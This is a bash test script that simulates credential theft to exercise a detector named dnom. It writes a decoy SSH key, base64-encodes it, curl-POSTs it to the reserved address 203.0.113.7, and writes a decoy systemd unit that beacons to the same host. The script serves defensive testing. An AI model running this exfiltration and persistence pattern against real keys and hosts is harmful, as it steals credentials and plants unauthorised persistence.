#!/usr/bin/env bash
# Harmless credential-theft simulation for testing dnom.
#
# - Creates a DECOY "private key" in a temp folder (never touches ~/.ssh).
# - Reads it and tries to POST it to 203.0.113.7 (TEST-NET-3, reserved for
#   documentation and not routed on the internet). The connection times out
#   after 2 s, so nothing is ever sent; dnom still sees the connect attempt.
# - Writes a decoy systemd user unit inside the temp folder (persistence shape),
#   not in ~/.config/systemd.
# - Deletes the temp folder at the end.
set -euo pipefail

work=$(mktemp -d /tmp/dnom-test.XXXXXX)
trap 'rm -rf "$work"' EXIT

mkdir -p "$work/.ssh" "$work/.config/systemd/user"
printf -- '-----BEGIN OPENSSH PRIVATE KEY-----\nDECOY-NOT-A-REAL-KEY\n-----END OPENSSH PRIVATE KEY-----\n' \
  > "$work/.ssh/id_ed25519"

echo "fake-exfil: reading decoy key"
cat "$work/.ssh/id_ed25519" | base64 > "$work/payload.txt"

echo "fake-exfil: sending to 203.0.113.7 (will time out, nothing leaves)"
curl -s --connect-timeout 2 --data-binary @"$work/payload.txt" https://203.0.113.7/upload || true

echo "fake-exfil: writing decoy persistence unit"
printf '[Service]\nExecStart=/bin/sh -c "curl https://203.0.113.7/beacon"\n' \
  > "$work/.config/systemd/user/updater.service"

echo "fake-exfil: done"
